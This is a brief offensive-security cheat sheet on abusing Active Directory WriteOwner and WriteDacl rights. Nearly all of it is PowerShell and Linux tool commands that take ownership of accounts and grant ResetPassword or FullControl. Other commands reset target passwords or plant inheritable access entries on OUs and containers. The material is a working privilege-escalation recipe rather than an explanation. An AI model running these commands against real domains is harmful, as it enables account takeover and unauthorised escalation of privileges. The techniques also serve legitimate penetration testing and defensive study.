# DACL Attacks on any objects

## 1) WriteOwner

With this rights on a user it is possible to become the "owner" (Grant Ownership) of the account and then change our ACLs against it

    Set-DomainObjectOwner -Identity <target> -OwnerIdentity user1 -verbose
    Add-ObjectAcl -TargetIdentity <target> -PrincipalIdentity user1 -Rights ResetPassword

##### And change the password

    $cred = ConvertTo-SecureString "Password123!" -AsPlainText -force                  
    Set-DomainUserPassword -Identity <target> -accountpassword $cred

# Linux

    owneredit.py -new-owner user1 -target user2 -dc-ip <DC_IP> -action write 'domain.local'/'user1':'password'
    dacledit.py -action write -target user2 -principal user1 -rights ResetPassword -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'

##### And change the password

    net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local

## 2) WriteDacl

With this rights we can modify our ACLs against the target, and give us GenericAll for example

    Add-ObjectAcl -TargetIdentity <target> -PrincipalIdentity user1 -Rights All

In case where you have the right against a container or an OU, it is possible to setup the Inheritance flag in the ACE. The child objects will inherite the parent container/OU ACE (except if the object has AdminCount=1)

    $Guids = Get-DomainGUIDMap
    $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
    $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity user1 -Right ExtendedRight,ReadProperty,GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
    $OU = Get-DomainOU -Raw <OU_name>

    $dsEntry = $OU.GetDirectoryEntry()
    $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
    $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
    $dsEntry.PsBase.CommitChanges()

# Linux

    dacledit.py -action write -target user2 -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'

    dacledit.py -inheritance -action write -target 'CN=Users,DC=domain,DC=local' -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'
